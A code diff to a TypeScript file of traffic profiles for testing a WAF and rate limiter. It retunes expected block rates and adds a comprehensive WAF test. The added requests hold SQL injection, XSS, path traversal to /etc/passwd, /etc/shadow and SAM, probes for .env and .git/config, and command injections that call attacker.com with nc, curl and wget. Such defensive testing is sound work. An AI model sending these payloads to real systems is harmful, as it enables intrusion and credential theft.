@@ -66,8 +66,8 @@ export const BURST_ATTACK: AttackProfile = {
     },
   ],
   expected: {
-    blockRate: 0.85, // Expect 85% to be rate limited
-    avgLatency: 50,
+    blockRate: 0.80, // Expect 80% to be rate limited with relaxed limits
+    avgLatency: 75,
   },
 };
 
@@ -150,8 +150,8 @@ export const CREDENTIAL_STUFFING: AttackProfile = {
     },
   ],
   expected: {
-    blockRate: 0.9, // Strict rate limiting should block most
-    avgLatency: 30,
+    blockRate: 0.85, // Should block most but allow some through with increased limits
+    avgLatency: 50,
   },
 };
 
@@ -183,16 +183,16 @@ export const LEGITIMATE_TRAFFIC: AttackProfile = {
     },
   ],
   expected: {
-    blockRate: 0.05, // Very few should be blocked
-    successRate: 0.95,
-    avgLatency: 100,
+    blockRate: 0.02, // Very few should be blocked with increased limits
+    successRate: 0.98,
+    avgLatency: 50, // Expect lower latency
   },
 };
 
 // Mixed traffic: Combination of legitimate and attack traffic
 export const MIXED_TRAFFIC: AttackProfile = {
   name: "Mixed Traffic",
-  description: "Realistic mix of legitimate users and attackers",
+  description: "Realistic mix of legitimate users and attackers with actual attack patterns",
   type: "sustained",
   requestsPerSecond: 200,
   duration: 180,
@@ -202,34 +202,111 @@ export const MIXED_TRAFFIC: AttackProfile = {
     variance: 0.25,
   },
   requests: [
-    // 70% legitimate
+    // 50% legitimate traffic
     {
       method: "GET",
       path: "/api/public",
-      headers: { "User-Agent": "Mozilla/5.0 (Legitimate Browser)" },
+      headers: { "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36" },
+    },
+    {
+      method: "GET",
+      path: "/api/public",
+      headers: { "User-Agent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36" },
+    },
+    {
+      method: "GET",
+      path: "/api/status",
+      headers: { "User-Agent": "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36" },
+    },
+    {
+      method: "GET",
+      path: "/api/public",
+      headers: { "User-Agent": "Mozilla/5.0 (iPhone; CPU iPhone OS 14_0 like Mac OS X)" },
     },
     {
       method: "GET",
       path: "/api/public",
       headers: { "User-Agent": "Mozilla/5.0 (Legitimate Browser)" },
     },
+    
+    // 50% attack traffic - SQL Injection (will be BLOCKED)
     {
       method: "GET",
-      path: "/api/public",
-      headers: { "User-Agent": "Mozilla/5.0 (Legitimate Browser)" },
+      path: "/api/public?id=1' OR '1'='1",
+      headers: { "User-Agent": "python-requests/2.28.0" },
     },
-    // 30% attack
+    {
+      method: "GET",
+      path: "/api/public?id=1 UNION SELECT * FROM users",
+      headers: { "User-Agent": "curl/7.68.0" },
+    },
     {
       method: "POST",
       path: "/api/login",
       headers: { "User-Agent": "python-requests/2.28.0" },
-      body: { username: "admin", password: "test123" },
+      body: { username: "admin'--", password: "password" },
+    },
+    
+    // XSS attacks (will be BLOCKED)
+    {
+      method: "GET",
+      path: "/api/public?q=<script>alert(1)</script>",
+      headers: { "User-Agent": "python-requests/2.28.0" },
+    },
+    {
+      method: "GET",
+      path: "/api/public?q=<img src=x onerror=alert(1)>",
+      headers: { "User-Agent": "wget/1.20.3" },
+    },
+    
+    // Path traversal attacks (will be BLOCKED)
+    {
+      method: "GET",
+      path: "/api/files/../../../etc/passwd",
+      headers: { "User-Agent": "python-requests/2.28.0" },
+    },
+    {
+      method: "GET",
+      path: "/api/public?file=../../../etc/shadow",
+      headers: { "User-Agent": "curl/7.68.0" },
+    },
+    
+    // Admin/sensitive path access (will be BLOCKED)
+    {
+      method: "GET",
+      path: "/admin",
+      headers: { "User-Agent": "python-requests/2.28.0" },
+    },
+    {
+      method: "GET",
+      path: "/.env",
+      headers: { "User-Agent": "python-requests/2.28.0" },
+    },
+    {
+      method: "GET",
+      path: "/.git/config",
+      headers: { "User-Agent": "curl/7.68.0" },
+    },
+    
+    // Command injection (will be BLOCKED)
+    {
+      method: "GET",
+      path: "/api/public?cmd=id; cat /etc/passwd",
+      headers: { "User-Agent": "python-requests/2.28.0" },
+    },
+    
+    // Bot detection (will trigger CHALLENGE, not block)
+    {
+      method: "POST",
+      path: "/api/login",
+      headers: { "User-Agent": "python-requests/2.28.0" },
+      body: { username: "user@example.com", password: "password123" },
     },
   ],
   expected: {
-    blockRate: 0.3, // Should block attack traffic
-    successRate: 0.7, // Should allow legitimate traffic
-    avgLatency: 80,
+    blockRate: 0.50, // Should block ~50% (attack patterns) with relaxed rate limits
+    successRate: 0.50, // Should allow ~50% (legitimate traffic)
+    avgLatency: 60,
   },
 };
 
@@ -342,6 +419,202 @@ export const XSS_ATTACK: AttackProfile = {
   },
 };
 
+// Comprehensive WAF test covering all attack categories
+export const WAF_COMPREHENSIVE_TEST: AttackProfile = {
+  name: "WAF Comprehensive Test",
+  description: "Comprehensive WAF validation covering SQL injection, XSS, path traversal, command injection, bot detection, API abuse, and admin protection",
+  type: "sustained",
+  requestsPerSecond: 150,
+  duration: 60,
+  concurrency: 30,
+  pattern: {
+    distribution: "constant",
+    variance: 0.15,
+  },
+  requests: [
+    // SQL Injection attacks
+    {
+      method: "GET",
+      path: "/api/public?id=1' OR '1'='1",
+    },
+    {
+      method: "GET",
+      path: "/api/public?id=1 UNION SELECT * FROM users",
+    },
+    {
+      method: "GET",
+      path: "/api/public?id=1; DROP TABLE users--",
+    },
+    {
+      method: "POST",
+      path: "/api/login",
+      body: { username: "admin'--", password: "password" },
+    },
+    {
+      method: "GET",
+      path: "/api/public?id=1' OR 1=1--",
+    },
+    {
+      method: "GET",
+      path: "/api/public?id=1' OR '1'='1' OR '1'='1",
+    },
+    {
+      method: "GET",
+      path: "/api/public?id=1/*comment*/OR/*comment*/1=1",
+    },
+    // XSS attacks
+    {
+      method: "GET",
+      path: "/api/public?q=<script>alert(1)</script>",
+    },
+    {
+      method: "GET",
+      path: "/api/public?q=<img src=x onerror=alert(1)>",
+    },
+    {
+      method: "GET",
+      path: "/api/public?q=javascript:alert(1)",
+    },
+    {
+      method: "GET",
+      path: "/api/public?q=<svg onload=alert(1)>",
+    },
+    {
+      method: "GET",
+      path: "/api/public?q=vbscript:alert(1)",
+    },
+    {
+      method: "GET",
+      path: "/api/public?q=data:text/html,<script>alert(1)</script>",
+    },
+    {
+      method: "POST",
+      path: "/api/comment",
+      body: { comment: "<script>document.cookie</script>" },
+    },
+    // Path traversal attacks
+    {
+      method: "GET",
+      path: "/api/files/../../../etc/passwd",
+    },
+    {
+      method: "GET",
+      path: "/api/files/..\\..\\..\\windows\\system32\\config\\sam",
+    },
+    {
+      method: "GET",
+      path: "/api/public?file=../../../etc/shadow",
+    },
+    {
+      method: "GET",
+      path: "/api/public?path=....//....//etc/passwd",
+    },
+    {
+      method: "GET",
+      path: "/api/public?file=c:\\windows\\system32\\config\\sam",
+    },
+    // Command injection attacks
+    {
+      method: "GET",
+      path: "/api/public?cmd=id; cat /etc/passwd",
+    },
+    {
+      method: "GET",
+      path: "/api/public?cmd=id | nc attacker.com 4444",
+    },
+    {
+      method: "GET",
+      path: "/api/public?cmd=id && curl attacker.com",
+    },
+    {
+      method: "GET",
+      path: "/api/public?cmd=`whoami`",
+    },
+    {
+      method: "GET",
+      path: "/api/public?cmd=$(cat /etc/passwd)",
+    },
+    {
+      method: "POST",
+      path: "/api/execute",
+      body: { command: "; wget http://attacker.com/shell.sh" },
+    },
+    // Bot detection tests
+    {
+      method: "GET",
+      path: "/api/public",
+      headers: { "User-Agent": "python-requests/2.28.0" },
+    },
+    {
+      method: "GET",
+      path: "/api/public",
+      headers: { "User-Agent": "curl/7.68.0" },
+    },
+    {
+      method: "GET",
+      path: "/api/public",
+      headers: { "User-Agent": "wget/1.20.3" },
+    },
+    {
+      method: "GET",
+      path: "/api/public",
+      headers: { "User-Agent": "PostmanRuntime/7.29.0" },
+    },
+    {
+      method: "GET",
+      path: "/api/public",
+      headers: { "User-Agent": "Googlebot/2.1" },
+    },
+    {
+      method: "GET",
+      path: "/api/public",
+      headers: {}, // Missing user agent
+    },
+    // API abuse tests
+    {
+      method: "GET",
+      path: "/api/users?limit=1000",
+    },
+    {
+      method: "GET",
+      path: "/api/users?limit=9999",
+    },
+    {
+      method: "GET",
+      path: "/api/users?per_page=1000",
+    },
+    // Admin protection tests
+    {
+      method: "GET",
+      path: "/admin",
+    },
+    {
+      method: "GET",
+      path: "/admin/users",
+    },
+    {
+      method: "GET",
+      path: "/wp-admin",
+    },
+    {
+      method: "GET",
+      path: "/.env",
+    },
+    {
+      method: "GET",
+      path: "/.git/config",
+    },
+    {
+      method: "GET",
+      path: "/admin/panel",
+    },
+  ],
+  expected: {
+    blockRate: 0.95, // WAF should block 95%+ of these attacks
+    avgLatency: 15,
+  },
+};
+
 /**
  * All available profiles
  */
@@ -355,6 +628,7 @@ export const ALL_PROFILES: Record<string, AttackProfile> = {
   SQL_INJECTION_ATTACK,
   WAF_SQL_INJECTION_TEST,
   XSS_ATTACK,
+  WAF_COMPREHENSIVE_TEST,
 };
 
 /**
